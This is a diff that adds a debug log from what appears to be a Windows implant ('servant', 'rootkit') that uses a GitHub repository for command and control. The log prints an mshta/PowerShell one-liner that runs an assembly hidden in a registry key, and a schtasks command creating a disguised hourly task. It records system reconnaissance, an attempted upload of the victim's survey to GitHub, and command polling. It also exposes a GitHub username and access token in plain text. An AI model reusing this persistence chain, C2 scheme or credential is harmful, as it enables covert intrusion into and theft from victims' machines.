@@ -1,0 +1,85 @@
+Thu Sep  2 13:11:28 2021. Initialisation of the log file.
+
+DEBUG: Thu Sep  2 13:11:28 2021: GithubLogin: hidemepls785
+DEBUG: Thu Sep  2 13:11:28 2021: GithubRepoName: furry-octo-parakeet
+DEBUG: Thu Sep  2 13:11:28 2021: GihubAccessToken: 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
+DEBUG: Thu Sep  2 13:11:28 2021: Rootkit Name: CorepPreprod2
+DEBUG: Thu Sep  2 13:11:28 2021: Rootkit Registry Key: Sensors
+DEBUG: Thu Sep  2 13:11:28 2021: Run Registry Key Name: test
+DEBUG: Thu Sep  2 13:11:28 2021: Adding the actual location of the servant: C:\Windows\SysWOW64\svchost.exe
+DEBUG: Thu Sep  2 13:11:29 2021: The folder list for random folder is not empty. Its size is: 1630
+DEBUG: Thu Sep  2 13:11:29 2021: The random path choosed for this execution is: C:\Users\clean\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\tk-TM
+DEBUG: Thu Sep  2 13:11:29 2021: Start of the method createSchTaskCommandLine. 
+DEBUG: Thu Sep  2 13:11:29 2021: This content will be written in the start up batch: @echo off
+mshta "javascript:close(new ActiveXObject('WScript.Shell').run('powershell \"[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(\\\"Software\\\\Microsoft\\\\Sensors\\\").GetValue($Null)).EntryPoint.Invoke(0,$Null)\"',0))"
+exit
+DEBUG: Thu Sep  2 13:11:29 2021: Start of the method writeFileWindowsApi.
+DEBUG: Thu Sep  2 13:11:29 2021: The content size that will be written: 264
+ERROR: Thu Sep  2 13:11:29 2021: Unable to get an handle to the file. Last Windows error: 80
+DEBUG: Thu Sep  2 13:11:29 2021: This command will be played: schtasks /create /TR "'cmd /MIN /c C:\Users\clean\AppData\Roaming\RegistryBackup.bat'" /TN WindowsRegistryUpdate /SC hourly
+DEBUG: Thu Sep  2 13:11:29 2021: End of the createSchTaskCommandLine method.
+DEBUG: Thu Sep  2 13:11:30 2021: The survey file for this target could not be found. Trying to create it and upload it to the github repo.
+DEBUG: Thu Sep  2 13:11:30 2021: This command will be executed to know systeminfo: systeminfo > C:\Users\clean\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\tk-TM\systeminfo.txt
+DEBUG: Thu Sep  2 13:11:41 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\tk-TM\systeminfo.txt
+DEBUG: Thu Sep  2 13:11:41 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Thu Sep  2 13:11:43 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\tk-TM\systeminfo.txt
+DEBUG: Thu Sep  2 13:11:43 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Thu Sep  2 13:11:45 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\tk-TM\systeminfo.txt
+DEBUG: Thu Sep  2 13:11:45 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Thu Sep  2 13:11:47 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\tk-TM\systeminfo.txt
+DEBUG: Thu Sep  2 13:11:47 2021: The file that will be read weight: 4550
+DEBUG: Thu Sep  2 13:11:47 2021: Success to read the binary file. This number of bytes have been read: 4551
+DEBUG: Thu Sep  2 13:11:47 2021: Success to delete the temporary file that store the powershell output
+DEBUG: Thu Sep  2 13:11:47 2021: This command will be executed to know the last reboot time: wmic os get lastBootUpTime > C:\Users\clean\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\tk-TM\systeminfo.txt
+DEBUG: Thu Sep  2 13:11:51 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\tk-TM\systeminfo.txt
+DEBUG: Thu Sep  2 13:11:51 2021: Unable to have an handle on the file. Last Windows error: 32
+DEBUG: Thu Sep  2 13:11:53 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\tk-TM\systeminfo.txt
+DEBUG: Thu Sep  2 13:11:53 2021: The file that will be read weight: 134
+DEBUG: Thu Sep  2 13:11:53 2021: Success to read the binary file. This number of bytes have been read: 135
+DEBUG: Thu Sep  2 13:11:53 2021: Success to delete the temporary file that store the powershell output
+DEBUG: Thu Sep  2 13:11:53 2021: Start of the method writeFileWindowsApi.
+DEBUG: Thu Sep  2 13:11:53 2021: The content size that will be written: 4929
+DEBUG: Thu Sep  2 13:11:53 2021: Success to write the content(number of bytes : 4929) in the file : C:\Users\clean\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\tk-TM\clean-survey.txt
+DEBUG: Thu Sep  2 13:11:53 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Thu Sep  2 13:11:53 2021: Start of the method readFileWindowsApi for the file: C:\Users\clean\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\tk-TM\clean-survey.txt
+DEBUG: Thu Sep  2 13:11:53 2021: The file that will be read weight: 4929
+DEBUG: Thu Sep  2 13:11:53 2021: Success to read the binary file. This number of bytes have been read: 4930
+DEBUG: Thu Sep  2 13:11:54 2021: The files C:\Users\clean\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\tk-TM\clean-survey.txt has not been uploaded in the github repo with the name: clean-survey.txt. Here is the answer of the api : {
+  "message": "clean-survey.txt does not match ",
+  "documentation_url": "https://docs.github.com/rest/reference/repos#create-or-update-file-contents"
+}
+
+DEBUG: Thu Sep  2 13:11:54 2021: Url: https://api.github.com/repos/hidemepls785/furry-octo-parakeet/contents/clean-survey.txt credentials: hidemepls785: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
+DEBUG: Thu Sep  2 13:11:54 2021: Success deleting the survey file.
+DEBUG: Thu Sep  2 13:11:54 2021: Start of a new loop to get commands and treat them.
+DEBUG: Thu Sep  2 13:11:54 2021: Start of GithubCommunication::receiveInstructions
+ERROR: Thu Sep  2 13:11:55 2021: Heart attack, the servant has major bug during receiveInstructionsFromGithub.
+ERROR: Thu Sep  2 13:11:55 2021: Unknown exception
+DEBUG: Thu Sep  2 13:11:55 2021: No commands are given in the github repo.
+DEBUG: Thu Sep  2 13:11:55 2021: Unable to have receive sucess, trying another loop.
+DEBUG: Thu Sep  2 13:11:55 2021: Start of a new loop to get commands and treat them.
+DEBUG: Thu Sep  2 13:11:55 2021: Start of GithubCommunication::receiveInstructions
+ERROR: Thu Sep  2 13:11:55 2021: Heart attack, the servant has major bug during receiveInstructionsFromGithub.
+ERROR: Thu Sep  2 13:11:55 2021: Unknown exception
+DEBUG: Thu Sep  2 13:11:55 2021: No commands are given in the github repo.
+DEBUG: Thu Sep  2 13:11:55 2021: Unable to have receive sucess, trying another loop.
+DEBUG: Thu Sep  2 13:11:55 2021: Start of a new loop to get commands and treat them.
+DEBUG: Thu Sep  2 13:11:55 2021: Start of GithubCommunication::receiveInstructions
+ERROR: Thu Sep  2 13:11:56 2021: Heart attack, the servant has major bug during receiveInstructionsFromGithub.
+ERROR: Thu Sep  2 13:11:56 2021: Unknown exception
+DEBUG: Thu Sep  2 13:11:56 2021: No commands are given in the github repo.
+DEBUG: Thu Sep  2 13:11:56 2021: Unable to have receive sucess, trying another loop.
+DEBUG: Thu Sep  2 13:11:56 2021: Start of a new loop to get commands and treat them.
+DEBUG: Thu Sep  2 13:11:56 2021: Start of GithubCommunication::receiveInstructions
+ERROR: Thu Sep  2 13:11:56 2021: Heart attack, the servant has major bug during receiveInstructionsFromGithub.
+ERROR: Thu Sep  2 13:11:56 2021: Unknown exception
+DEBUG: Thu Sep  2 13:11:56 2021: No commands are given in the github repo.
+DEBUG: Thu Sep  2 13:11:56 2021: Unable to have receive sucess, trying another loop.
+DEBUG: Thu Sep  2 13:11:56 2021: Start of a new loop to get commands and treat them.
+DEBUG: Thu Sep  2 13:11:56 2021: Start of GithubCommunication::receiveInstructions
+ERROR: Thu Sep  2 13:11:57 2021: Heart attack, the servant has major bug during receiveInstructionsFromGithub.
+ERROR: Thu Sep  2 13:11:57 2021: Unknown exception
+DEBUG: Thu Sep  2 13:11:57 2021: No commands are given in the github repo.
+DEBUG: Thu Sep  2 13:11:57 2021: Unable to have receive sucess, trying another loop.
+DEBUG: Thu Sep  2 13:11:57 2021: This is the end of servant mission.
+DEBUG: Thu Sep  2 13:11:57 2021: Start of GithubCommunication::sendLogs
